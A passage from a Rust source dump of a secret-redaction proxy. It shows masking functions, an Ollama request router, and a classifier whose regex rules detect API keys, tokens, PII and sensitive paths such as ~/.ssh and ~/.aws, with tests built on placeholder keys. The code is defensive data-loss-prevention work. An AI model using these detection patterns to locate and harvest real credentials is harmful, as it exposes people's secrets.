                "skipping finding: offset not on UTF-8 boundary"
            );
            continue;
        }

        // Copy text before this finding
        result.push_str(&input[pos..start]);

        // Insert redaction
        let hash = short_hash(&finding.matched_text);
        result.push_str(&format!("[REDACTED:{}:{}]", finding.category, hash));

        pos = end;
    }

    // Copy remaining text after last finding
    if pos < input.len() {
        result.push_str(&input[pos..]);
    }

    result
}

/// Generate a 6-character hash of the matched text for correlation.
fn short_hash(text: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(text.as_bytes());
    let result = hasher.finalize();
    hex::encode(&result[..3]) // 6 hex chars
}

/// Mask findings in a JSON body, preserving JSON structure.
/// Falls back to plain text masking if the input is not valid JSON.
pub fn mask_findings_json(input: &str, findings: &[Finding]) -> String {
    if findings.is_empty() {
        return input.to_string();
    }

    // Try JSON-aware masking first
    if let Ok(mut value) = serde_json::from_str::<serde_json::Value>(input) {
        mask_json_value(&mut value, findings);
        return serde_json::to_string(&value).unwrap_or_else(|_| mask_findings(input, findings));
    }

    // Fallback to plain text masking
    mask_findings(input, findings)
}

fn mask_json_value(value: &mut serde_json::Value, findings: &[Finding]) {
    match value {
        serde_json::Value::String(s) => {
            // Check if any findings match within this string
            let string_findings: Vec<&Finding> = findings
                .iter()
                .filter(|f| s.contains(&f.matched_text))
                .collect();
            for finding in string_findings {
                let hash = short_hash(&finding.matched_text);
                let replacement = format!("[REDACTED:{}:{}]", finding.category, hash);
                *s = s.replace(&finding.matched_text, &replacement);
            }
        }
        serde_json::Value::Array(arr) => {
            for item in arr.iter_mut() {
                mask_json_value(item, findings);
            }
        }
        serde_json::Value::Object(map) => {
            for (_key, val) in map.iter_mut() {
                mask_json_value(val, findings);
            }
        }
        _ => {}
    }
}

mod hex {
    pub fn encode(bytes: &[u8]) -> String {
        bytes.iter().map(|b| format!("{:02x}", b)).collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use eidra_scan::findings::{Category, Finding, Severity};

    #[test]
    fn test_mask_single_finding() {
        let input = "my key is AKIAIOSFODNN7EXAMPLE here";
        let finding = Finding::new(
            Category::ApiKey,
            Severity::Critical,
            "aws_access_key",
            "AWS Access Key",
            "AKIAIOSFODNN7EXAMPLE",
            10,
            20,
        );
        let result = mask_findings(input, &[finding]);
        assert!(result.contains("[REDACTED:api_key:"));
        assert!(!result.contains("AKIAIOSFODNN7EXAMPLE"));
    }

    #[test]
    fn test_mask_multiple_findings() {
        let input = "key AKIAIOSFODNN7EXAMPLE email test@example.com";
        let findings = vec![
            Finding::new(
                Category::ApiKey,
                Severity::Critical,
                "aws",
                "k",
                "AKIAIOSFODNN7EXAMPLE",
                4,
                20,
            ),
            Finding::new(
                Category::Pii,
                Severity::Medium,
                "email",
                "e",
                "test@example.com",
                31,
                16,
            ),
        ];
        let result = mask_findings(input, &findings);
        assert!(!result.contains("AKIAIOSFODNN7EXAMPLE"));
        assert!(!result.contains("test@example.com"));
        assert!(result.contains("[REDACTED:api_key:"));
        assert!(result.contains("[REDACTED:pii:"));
    }

    #[test]
    fn test_mask_json_preserves_structure() {
        let input =
            r#"{"messages":[{"role":"user","content":"key is AKIAIOSFODNN7EXAMPLE here"}]}"#;
        let finding = Finding::new(
            Category::ApiKey,
            Severity::Critical,
            "aws",
            "k",
            "AKIAIOSFODNN7EXAMPLE",
            42,
            20,
        );
        let result = mask_findings_json(input, &[finding]);
        // Should be valid JSON
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();
        let content = parsed["messages"][0]["content"].as_str().unwrap();
        assert!(content.contains("[REDACTED:api_key:"));
        assert!(!content.contains("AKIAIOSFODNN7EXAMPLE"));
    }

    #[test]
    fn test_mask_json_fallback_plaintext() {
        let input = "not json: AKIAIOSFODNN7EXAMPLE";
        let finding = Finding::new(
            Category::ApiKey,
            Severity::Critical,
            "aws",
            "k",
            "AKIAIOSFODNN7EXAMPLE",
            10,
            20,
        );
        let result = mask_findings_json(input, &[finding]);
        assert!(!result.contains("AKIAIOSFODNN7EXAMPLE"));
    }

    #[test]
    fn test_mask_preserves_surrounding_text() {
        let input = "before SECRET after";
        let finding = Finding::new(
            Category::SecretKey,
            Severity::High,
            "secret",
            "s",
            "SECRET",
            7,
            6,
        );
        let result = mask_findings(input, &[finding]);
        assert!(result.starts_with("before "));
        assert!(result.ends_with(" after"));
    }
}
```

### crates/eidra-router/src/ollama.rs
```rust
use http_body_util::{BodyExt, Full};
use hyper::body::Bytes;
use hyper::Request;
use hyper_util::client::legacy::Client;
use hyper_util::rt::TokioExecutor;
use tracing::{debug, warn};

use crate::error::RouterError;

/// Router for forwarding requests to a local Ollama instance.
///
/// Converts OpenAI-format chat completion requests to Ollama's API format
/// and forwards them to the configured endpoint.
pub struct OllamaRouter {
    /// Ollama API endpoint (e.g., "http://localhost:11434").
    endpoint: String,

    /// Default model to use (e.g., "qwen2.5:latest").
    model: String,
}

impl OllamaRouter {
    /// Create a new OllamaRouter with the given endpoint and model.
    pub fn new(endpoint: &str, model: &str) -> Self {
        Self {
            endpoint: endpoint.to_string(),
            model: model.to_string(),
        }
    }

    /// Get the configured endpoint.
    pub fn endpoint(&self) -> &str {
        &self.endpoint
    }

    /// Get the configured model.
    pub fn model(&self) -> &str {
        &self.model
    }

    /// Convert an OpenAI-format request body to Ollama format and send it.
    ///
    /// OpenAI format:
    /// ```json
    /// {"model":"gpt-4","messages":[{"role":"user","content":"..."}]}
    /// ```
    ///
    /// Ollama format:
    /// ```json
    /// {"model":"qwen2.5:latest","messages":[{"role":"user","content":"..."}],"stream":false}
    /// ```
    ///
    /// The model field is overridden with the configured Ollama model.
    /// Streaming is disabled for simplicity in v1.
    pub async fn route(&self, openai_body: &str) -> Result<String, RouterError> {
        let ollama_body = self.convert_openai_to_ollama(openai_body)?;

        let uri = format!("{}/api/chat", self.endpoint);
        debug!("Routing to Ollama: {}", uri);

        let req = Request::builder()
            .method("POST")
            .uri(&uri)
            .header("Content-Type", "application/json")
            .body(Full::new(Bytes::from(ollama_body)))
            .map_err(|e| RouterError::Custom(format!("Failed to build request: {}", e)))?;

        let client = Client::builder(TokioExecutor::new()).build_http();

        let resp = client.request(req).await.map_err(|e| {
            warn!("Ollama request failed: {}", e);
            RouterError::OllamaUnavailable {
                endpoint: self.endpoint.clone(),
            }
        })?;

        let status = resp.status();
        let body_bytes = resp
            .into_body()
            .collect()
            .await
            .map_err(|e| RouterError::UpstreamError(format!("Failed to read response: {}", e)))?
            .to_bytes();

        let body_str = String::from_utf8_lossy(&body_bytes).to_string();

        if !status.is_success() {
            return Err(RouterError::UpstreamError(format!(
                "Ollama returned status {}: {}",
                status, body_str
            )));
        }

        Ok(body_str)
    }

    /// Check if the Ollama instance is available by hitting the root endpoint.
    pub async fn health_check(&self) -> bool {
        let uri = self.endpoint.clone();

        let req = match Request::builder()
            .method("GET")
            .uri(&uri)
            .body(Full::new(Bytes::new()))
        {
            Ok(r) => r,
            Err(_) => return false,
        };

        let client = Client::builder(TokioExecutor::new()).build_http();

        match client.request(req).await {
            Ok(resp) => resp.status().is_success(),
            Err(_) => false,
        }
    }

    /// Convert an OpenAI-format chat completion body to Ollama format.
    ///
    /// - Overrides the "model" field with the configured Ollama model.
    /// - Sets "stream" to false.
    /// - Preserves the "messages" array and other compatible fields.
    fn convert_openai_to_ollama(&self, openai_body: &str) -> Result<String, RouterError> {
        let mut body: serde_json::Value = serde_json::from_str(openai_body)
            .map_err(|e| RouterError::FormatConversion(format!("Invalid JSON: {}", e)))?;

        let obj = body.as_object_mut().ok_or_else(|| {
            RouterError::FormatConversion("Request body must be a JSON object".to_string())
        })?;

        // Override model with configured Ollama model
        obj.insert(
            "model".to_string(),
            serde_json::Value::String(self.model.clone()),
        );

        // Disable streaming for v1
        obj.insert("stream".to_string(), serde_json::Value::Bool(false));

        // Remove OpenAI-specific fields that Ollama doesn't understand
        let openai_only_fields = [
            "frequency_penalty",
            "presence_penalty",
            "logprobs",
            "top_logprobs",
            "n",
            "response_format",
            "tools",
            "tool_choice",
            "user",
            "logit_bias",
        ];
        for field in &openai_only_fields {
            obj.remove(*field);
        }

        serde_json::to_string(&body)
            .map_err(|e| RouterError::FormatConversion(format!("Failed to serialize: {}", e)))
    }
}

impl Default for OllamaRouter {
    fn default() -> Self {
        Self::new("http://localhost:11434", "qwen2.5:latest")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_new_with_defaults() {
        let router = OllamaRouter::default();
        assert_eq!(router.endpoint(), "http://localhost:11434");
        assert_eq!(router.model(), "qwen2.5:latest");
    }

    #[test]
    fn test_new_with_custom_values() {
        let router = OllamaRouter::new("http://192.168.1.100:11434", "llama3:8b");
        assert_eq!(router.endpoint(), "http://192.168.1.100:11434");
        assert_eq!(router.model(), "llama3:8b");
    }

    #[test]
    fn test_convert_openai_to_ollama_basic() {
        let router = OllamaRouter::new("http://localhost:11434", "qwen2.5:latest");
        let openai = r#"{"model":"gpt-4","messages":[{"role":"user","content":"Hello"}]}"#;

        let result = router.convert_openai_to_ollama(openai).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        assert_eq!(parsed["model"], "qwen2.5:latest");
        assert_eq!(parsed["stream"], false);
        assert_eq!(parsed["messages"][0]["role"], "user");
        assert_eq!(parsed["messages"][0]["content"], "Hello");
    }

    #[test]
    fn test_convert_strips_openai_specific_fields() {
        let router = OllamaRouter::new("http://localhost:11434", "qwen2.5:latest");
        let openai = r#"{
            "model": "gpt-4",
            "messages": [{"role": "user", "content": "Hi"}],
            "frequency_penalty": 0.5,
            "presence_penalty": 0.3,
            "logprobs": true,
            "n": 2,
            "user": "test-user"
        }"#;

        let result = router.convert_openai_to_ollama(openai).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        assert!(parsed.get("frequency_penalty").is_none());
        assert!(parsed.get("presence_penalty").is_none());
        assert!(parsed.get("logprobs").is_none());
        assert!(parsed.get("n").is_none());
        assert!(parsed.get("user").is_none());
        // These should remain
        assert_eq!(parsed["model"], "qwen2.5:latest");
        assert!(parsed.get("messages").is_some());
    }

    #[test]
    fn test_convert_preserves_temperature_and_max_tokens() {
        let router = OllamaRouter::new("http://localhost:11434", "qwen2.5:latest");
        let openai = r#"{
            "model": "gpt-4",
            "messages": [{"role": "user", "content": "Hi"}],
            "temperature": 0.7,
            "max_tokens": 100,
            "top_p": 0.9
        }"#;

        let result = router.convert_openai_to_ollama(openai).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        assert_eq!(parsed["temperature"], 0.7);
        assert_eq!(parsed["max_tokens"], 100);
        assert_eq!(parsed["top_p"], 0.9);
    }

    #[test]
    fn test_convert_invalid_json() {
        let router = OllamaRouter::default();
        let result = router.convert_openai_to_ollama("not json");
        assert!(result.is_err());
        match result.unwrap_err() {
            RouterError::FormatConversion(_) => {}
            other => panic!("Expected FormatConversion, got: {:?}", other),
        }
    }

    #[test]
    fn test_convert_non_object_json() {
        let router = OllamaRouter::default();
        let result = router.convert_openai_to_ollama("[1, 2, 3]");
        assert!(result.is_err());
        match result.unwrap_err() {
            RouterError::FormatConversion(msg) => {
                assert!(msg.contains("JSON object"));
            }
            other => panic!("Expected FormatConversion, got: {:?}", other),
        }
    }

    #[test]
    fn test_convert_system_message_preserved() {
        let router = OllamaRouter::default();
        let openai = r#"{
            "model": "gpt-4",
            "messages": [
                {"role": "system", "content": "You are helpful."},
                {"role": "user", "content": "Hi"}
            ]
        }"#;

        let result = router.convert_openai_to_ollama(openai).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        assert_eq!(parsed["messages"][0]["role"], "system");
        assert_eq!(parsed["messages"][0]["content"], "You are helpful.");
        assert_eq!(parsed["messages"][1]["role"], "user");
    }
}
```

### crates/eidra-scan/src/classifier.rs
```rust
use crate::findings::Finding;

/// Trait for all data classifiers.
pub trait Classifier: Send + Sync {
    fn classify(&self, input: &str) -> Vec<Finding>;
    fn name(&self) -> &str;
}
```

### crates/eidra-scan/src/findings.rs
```rust
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
    Info,
    Custom(String),
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Critical => write!(f, "CRITICAL"),
            Self::High => write!(f, "HIGH"),
            Self::Medium => write!(f, "MEDIUM"),
            Self::Low => write!(f, "LOW"),
            Self::Info => write!(f, "INFO"),
            Self::Custom(s) => write!(f, "{}", s),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum Category {
    ApiKey,
    SecretKey,
    PrivateKey,
    Token,
    Credential,
    Pii,
    InternalInfra,
    SensitivePath,
    HighEntropy,
    Custom(String),
}

impl std::fmt::Display for Category {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ApiKey => write!(f, "api_key"),
            Self::SecretKey => write!(f, "secret_key"),
            Self::PrivateKey => write!(f, "private_key"),
            Self::Token => write!(f, "token"),
            Self::Credential => write!(f, "credential"),
            Self::Pii => write!(f, "pii"),
            Self::InternalInfra => write!(f, "internal_infra"),
            Self::SensitivePath => write!(f, "sensitive_path"),
            Self::HighEntropy => write!(f, "high_entropy"),
            Self::Custom(s) => write!(f, "{}", s),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub id: Uuid,
    pub category: Category,
    pub severity: Severity,
    pub rule_name: String,
    pub description: String,
    pub matched_text: String,
    pub offset: usize,
    pub length: usize,
    pub timestamp: DateTime<Utc>,
    pub metadata: HashMap<String, String>,
}

impl Finding {
    pub fn new(
        category: Category,
        severity: Severity,
        rule_name: impl Into<String>,
        description: impl Into<String>,
        matched_text: impl Into<String>,
        offset: usize,
        length: usize,
    ) -> Self {
        Self {
            id: Uuid::new_v4(),
            category,
            severity,
            rule_name: rule_name.into(),
            description: description.into(),
            matched_text: matched_text.into(),
            offset,
            length,
            timestamp: Utc::now(),
            metadata: HashMap::new(),
        }
    }
}
```

### crates/eidra-scan/src/lib.rs
```rust
pub mod classifier;
pub mod findings;
pub mod rules;
pub mod scanner;
```

### crates/eidra-scan/src/rules/builtin.rs
```rust
use crate::classifier::Classifier;
use crate::findings::{Category, Finding, Severity};
use regex::Regex;

struct Rule {
    name: &'static str,
    pattern: Regex,
    category: Category,
    severity: Severity,
    description: &'static str,
}

pub struct TextClassifier {
    rules: Vec<Rule>,
}

impl TextClassifier {
    pub fn new() -> Self {
        let rules = vec![
            // 1. AWS Access Key
            Rule {
                name: "aws_access_key",
                pattern: Regex::new(r"AKIA[0-9A-Z]{16}").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::Critical,
                description: "AWS Access Key ID",
            },
            // 2. AWS Secret Key
            Rule {
                name: "aws_secret_key",
                pattern: Regex::new(r"(?i)(?:aws_secret_access_key|aws_secret)\s*[:=]\s*[A-Za-z0-9/+=]{40}").expect("valid regex"),
                category: Category::SecretKey,
                severity: Severity::Critical,
                description: "AWS Secret Access Key",
            },
            // 3. GitHub Token
            Rule {
                name: "github_token",
                pattern: Regex::new(r"gh[posru]_[A-Za-z0-9_]{36,}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "GitHub Personal Access Token",
            },
            // 4. GitLab Token
            Rule {
                name: "gitlab_token",
                pattern: Regex::new(r"glpat-[A-Za-z0-9\-_]{20,}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "GitLab Personal Access Token",
            },
            // 5. Slack Token
            Rule {
                name: "slack_token",
                pattern: Regex::new(r"xox[baprs]-[A-Za-z0-9\-]+").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "Slack API Token",
            },
            // 6. Stripe Key
            Rule {
                name: "stripe_key",
                pattern: Regex::new(r"[sr]k_live_[A-Za-z0-9]{20,}").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::Critical,
                description: "Stripe Live API Key",
            },
            // 7. Google API Key
            Rule {
                name: "google_api_key",
                pattern: Regex::new(r"AIza[A-Za-z0-9\-_]{35}").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::High,
                description: "Google API Key",
            },
            // 8. JWT
            Rule {
                name: "jwt",
                pattern: Regex::new(r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]*").expect("valid regex"),
                category: Category::Token,
                severity: Severity::Medium,
                description: "JSON Web Token",
            },
            // 9. Private Key Block
            Rule {
                name: "private_key",
                pattern: Regex::new(r"-----BEGIN[\s\w]*PRIVATE KEY-----").expect("valid regex"),
                category: Category::PrivateKey,
                severity: Severity::Critical,
                description: "Private Key Block",
            },
            // 10. Email Address
            Rule {
                name: "email_address",
                pattern: Regex::new(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}").expect("valid regex"),
                category: Category::Pii,
                severity: Severity::Medium,
                description: "Email Address",
            },
            // 11. Phone (International)
            Rule {
                name: "phone_international",
                pattern: Regex::new(r"\+[1-9]\d{6,14}").expect("valid regex"),
                category: Category::Pii,
                severity: Severity::Medium,
                description: "International Phone Number",
            },
            // 12. Credit Card (Visa/MC/Amex)
            Rule {
                name: "credit_card",
                pattern: Regex::new(r"\b(?:4\d{15}|5[1-5]\d{14}|3[47]\d{13})\b").expect("valid regex"),
                category: Category::Pii,
                severity: Severity::Critical,
                description: "Credit Card Number",
            },
            // 13. US SSN
            Rule {
                name: "us_ssn",
                pattern: Regex::new(r"\b\d{3}-\d{2}-\d{4}\b").expect("valid regex"),
                category: Category::Pii,
                severity: Severity::Critical,
                description: "US Social Security Number",
            },
            // 14. IPv4 Address (excluding common non-sensitive IPs)
            Rule {
                name: "ipv4_address",
                pattern: Regex::new(r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b").expect("valid regex"),
                category: Category::InternalInfra,
                severity: Severity::Low,
                description: "IPv4 Address",
            },
            // 15. DB Connection String
            Rule {
                name: "db_connection_string",
                pattern: Regex::new(r#"(?i)(?:postgres|mysql|mongodb|redis)://[^\s'""]+"#).expect("valid regex"),
                category: Category::Credential,
                severity: Severity::High,
                description: "Database Connection String",
            },
            // 16. Env Variable Assignment (secrets)
            Rule {
                name: "env_secret_assignment",
                pattern: Regex::new(r#"(?i)(?:api[_\-]?key|secret|password|token|auth[_\-]?token)\s*=\s*['"]?[A-Za-z0-9/+=]{8,}['"]?"#).expect("valid regex"),
                category: Category::Credential,
                severity: Severity::High,
                description: "Environment Variable Secret Assignment",
            },
            // 17. Internal Hostname
            Rule {
                name: "internal_hostname",
                pattern: Regex::new(r"\b\w+\.(?:internal|local|corp|private)\.\w+\b").expect("valid regex"),
                category: Category::InternalInfra,
                severity: Severity::Low,
                description: "Internal Hostname",
            },
            // 18. Password Assignment
            Rule {
                name: "password_assignment",
                pattern: Regex::new(r#"(?i)password\s*[:=]\s*['"][^'"]{4,}['"]"#).expect("valid regex"),
                category: Category::Credential,
                severity: Severity::High,
                description: "Password Assignment",
            },
            // 19. High Entropy Base64 (40+ chars)
            Rule {
                name: "high_entropy_base64",
                pattern: Regex::new(r"[A-Za-z0-9+/=]{40,}").expect("valid regex"),
                category: Category::HighEntropy,
                severity: Severity::Medium,
                description: "High Entropy Base64 String",
            },
            // 20. Sensitive File Path
            Rule {
                name: "sensitive_file_path",
                pattern: Regex::new(r"(?:/\.ssh/|/\.aws/|/\.env\b|/\.gnupg/)").expect("valid regex"),
                category: Category::SensitivePath,
                severity: Severity::Medium,
                description: "Sensitive File Path",
            },
            // 21. Azure Storage Key
            Rule {
                name: "azure_storage_key",
                pattern: Regex::new(r"AccountKey=[A-Za-z0-9+/=]{88}").expect("valid regex"),
                category: Category::SecretKey,
                severity: Severity::Critical,
                description: "Azure Storage Account Key",
            },
            // 22. Heroku API Key
            Rule {
                name: "heroku_api_key",
                pattern: Regex::new(r"[hH][eE][rR][oO][kK][uU].*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::High,
                description: "Heroku API Key",
            },
            // 23. Twilio Account SID
            Rule {
                name: "twilio_account_sid",
                pattern: Regex::new(r"AC[a-z0-9]{32}").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::High,
                description: "Twilio Account SID",
            },
            // 24. Twilio Auth Token
            Rule {
                name: "twilio_auth_token",
                pattern: Regex::new(r"(?i)twilio.*[0-9a-fA-F]{32}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "Twilio Auth Token",
            },
            // 25. Mailgun API Key
            Rule {
                name: "mailgun_api_key",
                pattern: Regex::new(r"key-[0-9a-zA-Z]{32}").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::High,
                description: "Mailgun API Key",
            },
            // 26. SendGrid API Key
            Rule {
                name: "sendgrid_api_key",
                pattern: Regex::new(r"SG\.[A-Za-z0-9\-_]{22,}\.[A-Za-z0-9\-_]{43,}").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::Critical,
                description: "SendGrid API Key",
            },
            // 27. Telegram Bot Token
            Rule {
                name: "telegram_bot_token",
                pattern: Regex::new(r"[0-9]{8,10}:[A-Za-z0-9_-]{35}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "Telegram Bot Token",
            },
            // 28. Discord Webhook
            Rule {
                name: "discord_webhook",
                pattern: Regex::new(r"https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "Discord Webhook URL",
            },
            // 29. Discord Bot Token
            Rule {
                name: "discord_bot_token",
                pattern: Regex::new(r"[MN][A-Za-z0-9]{23,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "Discord Bot Token",
            },
            // 30. npm Token
            Rule {
                name: "npm_token",
                pattern: Regex::new(r"npm_[A-Za-z0-9]{36}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "npm Access Token",
            },
            // 31. PyPI Token
            Rule {
                name: "pypi_token",
                pattern: Regex::new(r"pypi-[A-Za-z0-9]{150,}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "PyPI API Token",
            },
            // 32. Docker Registry Password
            Rule {
                name: "docker_registry_password",
                pattern: Regex::new(r#"(?i)docker.*password\s*[:=]\s*['"]?[^\s'"]+""#).expect("valid regex"),
                category: Category::Credential,
                severity: Severity::High,
                description: "Docker Registry Password",
            },
            // 33. Generic API Key Assignment
            Rule {
                name: "generic_api_key",
                pattern: Regex::new(r#"(?i)(?:api_key|apikey|api-key)\s*[:=]\s*['"]?[A-Za-z0-9_\-]{20,}['"]?"#).expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::Medium,
                description: "Generic API Key Assignment",
            },
            // 34. My Number (マイナンバー 12桁)
            Rule {
                name: "my_number",
                pattern: Regex::new(r"(?i)(?:マイナンバー|my[\s_-]*number|個人番号)[:\s]*\d{4}\s?\d{4}\s?\d{4}\b").expect("valid regex"),
                category: Category::Pii,
                severity: Severity::Critical,
                description: "My Number (マイナンバー 12-digit)",
            },
            // 35. Japanese Phone Number
            Rule {
                name: "japanese_phone",
                pattern: Regex::new(r"0[789]0-?\d{4}-?\d{4}").expect("valid regex"),
                category: Category::Pii,
                severity: Severity::Medium,
                description: "Japanese Mobile Phone Number",
            },
            // 36. Physical Address Heuristic
            Rule {
                name: "physical_address",
                pattern: Regex::new(r"\d{1,5}\s\w+\s(?:Street|St|Avenue|Ave|Road|Rd|Boulevard|Blvd|Drive|Dr|Court|Ct|Lane|Ln)").expect("valid regex"),
                category: Category::Pii,
                severity: Severity::Medium,
                description: "Physical Address (US format heuristic)",
            },
            // 37. Kubernetes Secret
            Rule {
                name: "kubernetes_secret",
                pattern: Regex::new(r"(?i)kind:\s*Secret").expect("valid regex"),
                category: Category::InternalInfra,
                severity: Severity::High,
                description: "Kubernetes Secret Manifest",
            },
            // 38. Terraform State Secret
            Rule {
                name: "terraform_state_secret",
                pattern: Regex::new(r#"(?i)"type":\s*"aws_"#).expect("valid regex"),
                category: Category::InternalInfra,
                severity: Severity::Medium,
                description: "Terraform State File (AWS resource)",
            },
            // 39. Authorization Bearer Header
            Rule {
                name: "authorization_bearer",
                pattern: Regex::new(r"(?i)authorization:\s*bearer\s+[A-Za-z0-9\-._~+/]+=*").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "Authorization Bearer Header",
            },
            // 40. Redis URL
            Rule {
                name: "redis_url",
                pattern: Regex::new(r#"redis://[^\s'"]+"#).expect("valid regex"),
                category: Category::Credential,
                severity: Severity::High,
                description: "Redis Connection URL",
            },
            // 41. Postmark Server Token
            Rule {
                name: "postmark_server_token",
                pattern: Regex::new(r"(?i)postmark.*[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "Postmark Server Token",
            },
            // 42. Databricks Token
            Rule {
                name: "databricks_token",
                pattern: Regex::new(r"dapi[a-z0-9]{32}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::High,
                description: "Databricks Access Token",
            },
            // 43. OpenAI API Key
            Rule {
                name: "openai_api_key",
                pattern: Regex::new(r"sk-[A-Za-z0-9]{20,}T3BlbkFJ[A-Za-z0-9]{20,}").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::Critical,
                description: "OpenAI API Key",
            },
            // 44. Anthropic API Key
            Rule {
                name: "anthropic_api_key",
                pattern: Regex::new(r"sk-ant-[A-Za-z0-9\-_]{80,}").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::Critical,
                description: "Anthropic API Key",
            },
            // 45. Supabase Key
            Rule {
                name: "supabase_key",
                pattern: Regex::new(r"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::High,
                description: "Supabase API Key (JWT)",
            },
            // 46. Firebase Config
            Rule {
                name: "firebase_config",
                pattern: Regex::new(r"(?i)firebase.*apiKey.*AIza").expect("valid regex"),
                category: Category::ApiKey,
                severity: Severity::High,
                description: "Firebase Configuration with API Key",
            },
            // 47. HashiCorp Vault Token
            Rule {
                name: "hashicorp_vault_token",
                pattern: Regex::new(r"hvs\.[A-Za-z0-9]{24,}").expect("valid regex"),
                category: Category::Token,
                severity: Severity::Critical,
                description: "HashiCorp Vault Token",
            },
        ];

        Self { rules }
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }
}

impl Default for TextClassifier {
    fn default() -> Self {
        Self::new()
    }
}

impl Classifier for TextClassifier {
    fn classify(&self, input: &str) -> Vec<Finding> {
        let mut findings = Vec::new();
        for rule in &self.rules {
            for mat in rule.pattern.find_iter(input) {
                // Rule 14: skip common non-sensitive IPs
                if rule.name == "ipv4_address" {
                    let ip = mat.as_str();
                    if ip == "127.0.0.1" || ip == "0.0.0.0" || ip.starts_with("255.") {
                        continue;
                    }
                }
                // Rule 19: check Shannon entropy for high-entropy strings
                if rule.name == "high_entropy_base64" {
                    let entropy = shannon_entropy(mat.as_str());
                    if entropy < 4.5 {
                        continue;
                    }
                }
                findings.push(Finding::new(
                    rule.category.clone(),
                    rule.severity.clone(),
                    rule.name,
                    rule.description,
                    mat.as_str(),
                    mat.start(),
                    mat.len(),
                ));
            }
        }
        findings
    }

    fn name(&self) -> &str {
        "text_classifier"
    }
}

fn shannon_entropy(s: &str) -> f64 {
    let mut freq = [0u32; 256];
    let len = s.len() as f64;
    for &b in s.as_bytes() {
        freq[b as usize] += 1;
    }
    freq.iter()
        .filter(|&&count| count > 0)
        .map(|&count| {
            let p = count as f64 / len;
            -p * p.log2()
        })
        .sum()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn classify(input: &str) -> Vec<Finding> {
        let classifier = TextClassifier::new();
        classifier.classify(input)
    }

    fn has_rule(findings: &[Finding], rule_name: &str) -> bool {
        findings.iter().any(|f| f.rule_name == rule_name)
    }

    // 1. AWS Access Key
    #[test]
    fn test_aws_access_key_match() {
        let findings = classify("key is AKIAIOSFODNN7EXAMPLE");
        assert!(has_rule(&findings, "aws_access_key"));
    }
    #[test]
    fn test_aws_access_key_no_match() {
        let findings = classify("key is NOTAKEY1234567890AB");
        assert!(!has_rule(&findings, "aws_access_key"));
    }

    // 2. AWS Secret Key
    #[test]
    fn test_aws_secret_key_match() {
        let findings = classify("aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY");
        assert!(has_rule(&findings, "aws_secret_key"));
    }
    #[test]
    fn test_aws_secret_key_no_match() {
        let findings = classify("aws_region=us-east-1");
        assert!(!has_rule(&findings, "aws_secret_key"));
    }

    // 3. GitHub Token
    #[test]
    fn test_github_token_match() {
        let findings = classify("token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn");
        assert!(has_rule(&findings, "github_token"));
    }
    #[test]
    fn test_github_token_no_match() {
        let findings = classify("token: ghx_short");
        assert!(!has_rule(&findings, "github_token"));
    }

    // 4. GitLab Token
    #[test]
    fn test_gitlab_token_match() {
